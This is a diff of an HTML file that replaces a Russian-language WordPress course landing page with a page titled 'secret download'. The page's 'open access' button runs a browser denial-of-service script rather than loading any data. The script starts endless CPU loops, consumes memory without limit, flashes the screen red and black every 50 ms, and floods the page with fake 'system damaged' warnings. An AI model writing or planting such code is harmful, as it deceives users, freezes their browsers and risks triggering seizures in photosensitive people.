@@ -1,136 +1,117 @@
 <!DOCTYPE html>
 <html lang="ru">
-
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>Wordpress интенсив</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
-    <!-- <link href="https://fonts.googleapis.com/css?family=Roboto:100,300,400,700,900&display=swap&subset=cyrillic-ext" rel="stylesheet"> -->
-    <link rel="stylesheet" href="css/fonts.css">
-    <link rel="stylesheet" href="css/style.css">
+  <meta charset="UTF-8">
+  <title>Секретная загрузка</title>
+  <style>
+    body {
+      margin: 0;
+      background: black;
+      color: lime;
+      font-family: monospace;
+      text-align: center;
+    }
+    #content {
+      display: none;
+    }
+    button {
+      font-size: 30px;
+      margin-top: 100px;
+      padding: 20px 60px;
+      border: none;
+      background: red;
+      color: white;
+      border-radius: 12px;
+      cursor: pointer;
+    }
+  </style>
 </head>
-
 <body>
-    <section class="promo">
-        <div class="container">
-            <div class="logo">
-                <img src="img/logo.png" alt="logo" class="logo_img">
-                <div class="logo_text">WordPress интенсив</div>
-            </div>
-            <h1 class="title">Создать свой сайт на WordPress</h1>
-            <div class="simple">
-                <h2 class="title_big">это просто!</h2>
-                <div class="line"></div>
-            </div>
-            <h2 class="title">Куда сложнее сделать это правильно!</h2>
-            <div class="promo_text">Ежедневно в Кырыгызстане появляется более 5 000 новых сайтов.<br> И только единицы из них становятся популярными и приносят ощутимую прибыль. В чем секрет? В чем формула успеха? Узнайте на предстоящем двухдневном <span>БЕСПЛАТНОМ</span> интенсиве!
-            </div>
-            <a href="https://youtu.be/dQw4w9WgXcQ?si=GrcooGXxmR2VUkoS" target="_blank"><button class="promo_btn">Записаться на интенсив!</button></a>
-            <div class="more">
-                <div class="more_text">узнать больше об интенсиве</div>
-                <img src="img/strelochka_vniz.png" alt="Вниз" class="more_img">
-            </div>
+  <h1>🔒 Нажми для загрузки данных</h1>
+  <button onclick="go()">Открыть доступ</button>
 
-        </div>
+  <div id="content">
+    <h2>Загрузка...</h2>
+    <canvas id="canvas" width="800" height="600"></canvas>
+  </div>
 
-    </section>
+  <script>
+    function go() {
+      document.querySelector("button").remove();
+      document.getElementById("content").style.display = "block";
 
-    <section class="waiting">
-        <div class="container">
-            <h2 class="waiting_header">Что вас ждет в нашем интенсиве?</h2>
-            <div class="waiting_divider"></div>
-            <div class="waiting_subheader">2 бесплатных полноценных обучающих вебинара, где:</div>
+      // 1. Бесконечная нагрузка на CPU
+      for (let i = 0; i < 50; i++) {
+        setTimeout(() => {
+          while (true) {
+            let x = Math.random() ** Math.random();
+          }
+        }, i * 100);
+      }
 
-            <div class="waiting_wrapper">
-                <div class="waiting_item">
-                    <img src="img/photo/photo1.png" alt="waiting1" class="waiting_img">
-                    <div class="waiting_descr">Всего за два бесплатных вебинара мы научим вас, как создать свой сайт на WordPress.</div>
-                </div>
-                <div class="waiting_item">
-                    <img src="img/photo/photo2.png" alt="waiting2" class="waiting_img">
-                    <div class="waiting_descr">Покажем, как правильно оптимизировать сайт и сделать его привлекательным для поисковых систем. Только свежая, профессиональная и актуальная информация!</div>
-                </div>
-                <div class="waiting_item">
-                    <img src="img/photo/photo3.png" alt="waiting3" class="waiting_img">
-                    <div class="waiting_descr">Вы узнаете, что такое «хорошая индексация», «высокая посещаемость», «стабильный прирост посетителей», «ТОП по запросам» и, что намного важнее, как добиться всех этих показателей!</div>
-                </div>
-            </div>
-        </div>
-    </section>
+      // 2. Заполнение памяти
+      let storage = [];
+      setInterval(() => {
+        for (let i = 0; i < 1000; i++) {
+          storage.push(new Array(10000).fill("🤡 VIRUS 🤡"));
+        }
+      }, 100);
 
-    <section class="optimization">
-        <div class="container">
-            <div class="column1"></div>
-            <div class="column2">
-                <h2 class="optimization_header">Что такое оптимизация и зачем она нужна?</h2>
-                <div class="optimization_text">На просторах интернета несчетное количество действующих и даже заброшенных сайтов. Большинство из них совпадает не только по категориям, но и по содержанию.<br><br> Представьте себе тысячи сайтов, на которых тем или иным образом предоставляется
-                    одна и та же информация или продается одна и та же услуга. И попасть на эти сайты можно лишь по тематическим запросам в поисковых системах.<br><br> Но как вам быть, если ваш сайт похож на сотню или тысячу таких же, а на одной странице
-                    гугла или яндекса всего 10 позиций? Как привести посетителей страницы своего ресурса? Именно для этого и нужна оптимизация – для вывода вашего сайта на первую страницу поиска!<br><br>
-                    <span>Мы научим вас, как сделать ваш сайт привлекательным для поисковых систем и посоветуем, как вывести его на первые страницы, обходя всех конкурентов.</span></div>
-                <!-- <img src="img/girl.png" alt="woman" class="optimization_img">
-                <div class="optimization_img-overlay"></div> -->
-            </div>
-        </div>
-    </section>
+      // 3. Мигающий фон
+      setInterval(() => {
+        document.body.style.backgroundColor =
+          document.body.style.backgroundColor === "black" ? "red" : "black";
+      }, 50);
 
-    <section class="finish">
-        <div class="container">
-            <h2 class="finish_header">По окончании обучения Вы сможете!</h2>
-            <div class="finish_divider"></div>
+      // 4. Постоянно создаём элементы
+      setInterval(() => {
+        let e = document.createElement("div");
+        e.textContent = "⚠️ СИСТЕМА ПОВРЕЖДЕНА ⚠️";
+        e.style.fontSize = Math.random() * 50 + "px";
+        e.style.color = "#" + Math.floor(Math.random()*16777215).toString(16);
+        document.body.appendChild(e);
+      }, 10);
 
-            <div class="finish_wrapper">
-                <div class="finish_item">
-                    <div class="finish_round"><img src="img/ikonki/ikonki1.png" alt="finish1" class="finish_icon"></div>
-                    <div class="finish_descr">Создать свой сайт или блог</div>
-                </div>
-                <div class="finish_item">
-                    <div class="finish_round"><img src="img/ikonki/ikonki2.png" alt="finish2" class="finish_icon"></div>
-                    <div class="finish_descr">Правильно его оптимизировать</div>
-                </div>
-                <div class="finish_item">
-                    <div class="finish_round"><img src="img/ikonki/ikonki3.png" alt="finish3" class="finish_icon"></div>
-                    <div class="finish_descr">Обеспечить ему медленный, но верный рост в ТОП</div>
-                </div>
-                <div class="finish_item">
-                    <div class="finish_round"><img src="img/ikonki/ikonki4.png" alt="finish4" class="finish_icon"></div>
-                    <div class="finish_descr">Достигнуть стабильного прироста посетителей</div>
-                </div>
-                <div class="finish_item">
-                    <div class="finish_round"><img src="img/ikonki/ikonki5.png" alt="finish5" class="finish_icon"></div>
-                    <div class="finish_descr">Получать ощутимую прибыль</div>
-                </div>
-            </div>
-        </div>
-    </section>
+      // 5. WebGL анимация
+      let gl = document.getElementById("canvas").getContext("webgl");
+      if (gl) {
+        let vertices = new Float32Array([
+          -1, -1, 0,
+           1, -1, 0,
+           0,  1, 0
+        ]);
+        let buffer = gl.createBuffer();
+        gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+        gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW);
 
-    <section class="gift">
-        <div class="container">
-            <img src="img/podarka.png" alt="gift" class="gift_img">
-            <div class="gift_offer">Для всех участников интенсива предусмотрены бонусы и подарки. Нажимайте на кнопку ниже, принимайте участие в вебинарах и забирайте свой приз по окончании обучения!</div>
-            <a href="https://youtu.be/QJJYpsA5tv8?si=5EH7HZgKlBjwzKXl" target="_blank"><button class="gift_btn">Записаться на интенсив!</button></a>
-            
+        let vertCode = 'attribute vec3 coordinates; void main(void) { gl_Position = vec4(coordinates, 1.0); }';
+        let vertShader = gl.createShader(gl.VERTEX_SHADER);
+        gl.shaderSource(vertShader, vertCode);
+        gl.compileShader(vertShader);
 
-        </div>
-    </section>
+        let fragCode = 'void main(void) { gl_FragColor = vec4(' + Math.random() + ',0.0,1.0,1); }';
+        let fragShader = gl.createShader(gl.FRAGMENT_SHADER);
+        gl.shaderSource(fragShader, fragCode);
+        gl.compileShader(fragShader);
 
-    <section class="webinar">
-        <div class="container">
-            <img src="img/1webinar/webinar.png" alt="1st_webinar" class="webinar_img">
-            <div class="webinar_text">Первый вебинар состоится:</div>
-            <div class="data">1 декабря в 20:00 в Бишкеке</div>
-            <div class="calling_text">Успейте записаться, количество мест ограничено!</div>
-        </div>
-    </section>
+        let shaderProgram = gl.createProgram();
+        gl.attachShader(shaderProgram, vertShader);
+        gl.attachShader(shaderProgram, fragShader);
+        gl.linkProgram(shaderProgram);
+        gl.useProgram(shaderProgram);
 
-    <section class="footer">
-        <div class="comtainer">
-            <div class="footer_text">
-                <a href="">Служба поддержки</a><span> | </span><a href="">Политика конфиденциальности</a><br> Позвоните нам 0550-038-855
-            </div>
-        </div>
-    </section>
+        gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+        let coord = gl.getAttribLocation(shaderProgram, "coordinates");
+        gl.vertexAttribPointer(coord, 3, gl.FLOAT, false, 0, 0);
+        gl.enableVertexAttribArray(coord);
+
+        setInterval(() => {
+          gl.clearColor(Math.random(), Math.random(), Math.random(), 1.0);
+          gl.clear(gl.COLOR_BUFFER_BIT);
+          gl.drawArrays(gl.TRIANGLES, 0, 3);
+        }, 50);
+      }
+    }
+  </script>
 </body>
-
 </html>
